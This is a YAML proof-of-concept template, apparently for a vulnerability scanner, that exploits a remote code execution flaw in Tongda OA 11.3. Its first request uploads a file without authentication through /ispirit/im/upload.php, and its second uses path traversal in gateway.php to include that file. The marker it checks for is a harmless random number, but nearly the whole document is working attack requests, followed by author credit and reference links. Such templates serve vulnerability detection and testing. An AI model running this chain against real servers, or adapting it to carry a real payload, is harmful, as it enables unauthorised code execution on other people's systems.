name: poc-yaml-tongda-oa-rce
set:
  rand: randomInt(200000000, 210000000)
rules:
  - method: POST
    path: /ispirit/im/upload.php
    headers:
      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'
      Content-Type: >-
        multipart/form-data;charset=utf-8;boundary=---------------------------27723940316706158781839860668
      Accept-Encoding: 'deflate'
    body: |-
      -----------------------------27723940316706158781839860668
      Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
      Content-Type: image/jpeg

      {{rand}}
      -----------------------------27723940316706158781839860668
      Content-Disposition: form-data; name="P"

      {{rand}}
      -----------------------------27723940316706158781839860668
      Content-Disposition: form-data; name="DEST_UID"

      {{rand}}
      -----------------------------27723940316706158781839860668
      Content-Disposition: form-data; name="UPLOAD_MODE"

      1
      -----------------------------27723940316706158781839860668
    follow_redirects: false
    expression: |
      response.status == 200 && response.body.bcontains(b'jpg')
    search: (?P<dirname>200\d)_(?P<filename>\d+)
  - method: POST
    path: /ispirit/interface/gateway.php
    headers:
      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'
      Content-Type: 'application/x-www-form-urlencoded'
      Accept-Encoding: 'deflate'
    body: |
        json={"url":"../../../general/../attach/im/{{dirname}}/{{filename}}.jpg"}
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(rand)))
detail:
  author: 清风明月(www.secbook.info)
  demo_tongda_version: 'tongda-oa-11.3'
  links:
    - https://cdndown.tongda2000.com/oa/2019/TDOA11.3.exe
    - https://www.anquanke.com/post/id/201174
    - https://github.com/fuhei/tongda_rce/blob/master/tongda_rce.py